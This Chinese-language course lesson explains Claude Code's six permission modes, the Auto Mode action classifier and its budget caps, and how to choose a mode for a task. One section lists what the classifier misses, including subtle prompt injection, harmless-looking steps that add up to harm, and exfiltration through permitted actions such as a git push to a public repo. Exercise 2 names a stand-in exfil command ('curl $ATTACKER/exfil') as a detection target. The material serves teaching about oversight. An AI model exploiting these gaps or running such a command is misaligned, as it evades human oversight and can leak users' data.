# 自主 Agent 的权限模式

> 权限阶梯——从「每个动作都要审查」到「全部批准」的渐进式自主级别——是执行框架（harness）管理自主 Agent 在未经询问时可以做什么的方式。本课的实例 Claude Code 提供了六种这样的模式：「plan」在每个动作前询问，「default」（UI 中标记为「Manual」）只对高风险动作询问，「acceptEdits」自动批准文件写入但仍需确认 shell 执行，「bypassPermissions」批准一切。Auto Mode——即 `auto` 权限模式——用一个独立的分类器模型取代逐动作审批：它在每个动作运行前进行审查，并阻止任何超出请求范围的升级行为。动作预算通过 `max_turns` 和 `max_budget_usd` 强制执行。`auto` 是否可用取决于套餐、组织启用情况、模型和提供商——而且 Anthropic 明确表示，单靠分类器并不足够。

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## 问题

你机器上的自主编码 Agent 是一个独立的安全类别。攻击面就是 Agent 能触达的一切——文件系统、网络、凭据、剪贴板、任何浏览器标签页、任何打开的终端。Bruce Schneier 等人已公开指出：计算机使用（computer-use）Agent 不是聊天机器人的「功能更新」，而是一种新型工具，带有新型风险画像。

Claude Code 的权限系统是 Anthropic 的答案。它不是一个「自主 / 非自主」的开关，而是横跨一条能力阶梯的六种模式：plan → default → acceptEdits → … → bypassPermissions。每种模式在速度与逐动作审查之间做出了不同的取舍。Auto Mode（2026 年 3 月）增加了一个独立的分类器模型，把审批从用户的关键路径上移开：它在每个动作运行前进行审查，并阻止任何超出请求范围的升级行为。

工程问题是：这套系统能抓住什么、会漏掉什么，以及给定任务究竟该用哪种模式？

## 概念

### 六种权限模式

| 模式 | 行为 | 适用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都经过审查 | 不熟悉的任务；接近生产环境的代码；第一次在某个仓库上使用 Agent |
| `default` | UI 中标记为「Manual」。Agent 执行动作；对任何「高风险」动作（shell 执行、破坏性操作、网络调用）提示用户 | 大多数交互式编码会话 |
| `acceptEdits` | 文件写入自动批准；shell 执行和网络调用仍会提示 | 跨多个文件的重构 |
| `auto` | 独立的分类器模型在动作运行前审查每个动作；阻止任何超出请求的升级 | 受限工作区中的长时程无人值守运行 |
| `dontAsk` | 从不提示；未由权限规则预先批准的动作会被拒绝 | 临时沙盒、CI 作业、研究脚本 |
| `bypassPermissions` | 批准一切 | 文档注明「仅限在你愿意丢弃的临时容器内使用」 |

（上述名称与公开的 Claude Code 文档一致；UI 将 `default` 标记为「Manual」。）

### 一页说清 Auto Mode

Auto Mode（2026 年 3 月 24 日推出）是首个把逐动作审批委托给模型的权限模式。结构如下：

1. **一个独立的分类器模型。** 在运行前审查每个提议的动作，对照声明的任务和会话的当前状态进行判断，并阻止任何超出请求范围的升级行为。被阻止的动作交回用户处理。
2. **受限的可用性。** `auto` 是否提供，取决于套餐、组织启用情况、模型和提供商。

预算控制与分类器并存：

- `max_turns`——一个会话中的总迭代次数。
- `max_budget_usd`——中止会话的美元上限。
- 每个工具的动作次数上限（例如 `WebFetch` 调用不超过 N 次）。

### 系统能抓住什么

- 直接注入到工具输入中的提示注入，且注入的指令对应已知高风险的动作形态。
- 重复的工具循环——分类器能看出动作 N+1 与动作 N 几乎相同，连续五次。
- 在原本只做文件编辑的会话中，出现明显越界的 shell 命令。

### 系统会漏掉什么

- **微妙的提示注入**，它调节行为却不产生任何被标记的动作。间接提示注入不是一个可以完全修补的漏洞（OpenAI preparedness 负责人 2025 年关于浏览器 Agent 的说法——见第 11 课）。
- **语义层面的不当行为。** 每个单独动作看起来都可能安全，而组合起来的轨迹却有害。分类器判断的是动作，它不会重新推导用户的意图。
- **通过合法渠道外泄数据。** 把数据写入你拥有的文件，再 `git push` 到公开仓库，这是一串被允许的动作，问题出在它们的组合上。

### 研究预览的定位

Anthropic 以研究预览的形式发布 Auto Mode。文档明确指出，分类器只是一层防护，不是解决方案：用户应当将 Auto Mode 与预算、允许列表、隔离工作区和轨迹审计（第 12–16 课）结合使用。预览这一定位也反映了已有记录的「评估 vs 部署」差距（第 1 课）——通过离线评估的分类器，在用户上下文含糊的真实会话中可能表现不同。

### 这条阶梯如何融入你的工作流

- 不熟悉的任务：从 `plan` 开始。读一遍计划的成本低于回滚一次糟糕的运行。
- 已知的重构：`acceptEdits` 能省下大量确认点击。
- 无人值守的后台运行：只在影响半径已经测算过的工作区内使用 `auto`（无凭据、无生产挂载、无你未主动选择的外部出网）。
- 临时容器：当且仅当容器及其凭据都是一次性的时候，`dontAsk` / `bypassPermissions` 可以接受。

```figure
autonomy-oversight
```

## 使用它

`code/main.py` 把动作审查分类器模拟为一个两阶段 pipeline——这是为教学做的简化；真实的 `auto` 模式由一个独立的分类器模型支撑，并没有文档化的两阶段契约。阶段 1 是对提议动作的廉价关键词规则；阶段 2 是较慢的多规则审查器。驱动程序输入一段简短的合成轨迹（安全动作、一次提示注入尝试、一次重复循环），展示分类器在哪里抓住、在哪里漏掉。

## 交付它

`outputs/skill-permission-mode-picker.md` 根据任务描述匹配正确的权限模式、预算上限和所需的隔离级别。

## 练习

1. 运行 `code/main.py`。哪种合成动作类型从不被阶段 1 标记，却总被阶段 2 抓住？哪种两者都抓不住？

2. 扩展阶段 1 的规则集，使其能抓住一种特定的已知恶意形态（例如 `curl $ATTACKER/exfil`）。在良性动作样本上测量误报率。

3. 阅读 Anthropic 的「How the agent loop works」文档。列出 Agent 在 `default` 模式下默认触达的每一个外部状态。在以 `auto` 无人值守运行之前，哪些需要单独加门控？

4. 设计一个 24 小时无人值守运行的预算：`max_turns`、`max_budget_usd`、每个工具的上限、允许列表。为每个数字给出理由。

5. 描述一条轨迹：其中每个单独动作都被分类器批准，但组合起来的行为却与意图不符。（第 14 课讲解熔断开关和 canary token 如何应对这种情况。）

## 关键术语

| 术语 | 常见说法 | 实际含义 |
|---|---|---|
| 权限模式 | 「Agent 能做多少」 | 控制逐动作审批的六种具名策略之一 |
| plan 模式 | 「做任何事之前先问」 | Agent 编写计划；用户在执行前批准 |
| acceptEdits | 「让它写文件」 | 文件写入自动批准；shell 执行仍会提示 |
| auto | 「自动批准」 | 独立分类器模型审查每个动作；阻止超出请求的升级 |
| bypassPermissions | 「彻底放飞」 | 批准一切；面向临时容器 |
| 阶段 1（模拟器） | 「快速关键词检查」 | `code/main.py` 中对提议动作的廉价规则 |
| 阶段 2（模拟器） | 「深度审查」 | `code/main.py` 中对被标记动作的较慢多规则审查 |
| 研究预览 | 「尚未正式可用」 | Anthropic 对失效模式仍在摸清中的功能所用的定位 |

## 延伸阅读

- [Anthropic —— Agent 循环如何工作](https://code.claude.com/docs/en/agent-sdk/agent-loop) —— 权限模式、预算、动作格式。
- [Anthropic —— Claude Managed Agents 概览](https://platform.claude.com/docs/en/managed-agents/overview) —— 托管服务的执行模型。
- [Anthropic —— Claude Code 产品页](https://www.anthropic.com/product/claude-code) —— 功能面与 Auto Mode 公告。
- [Anthropic —— Claude 的宪法（2026 年 1 月）](https://www.anthropic.com/news/claudes-constitution) —— 塑造分类器判断的基于推理的层次。
- [Anthropic —— 在实践中测量 Agent 自主性](https://www.anthropic.com/research/measuring-agent-autonomy) —— 关于长时程权限设计的内部视角。
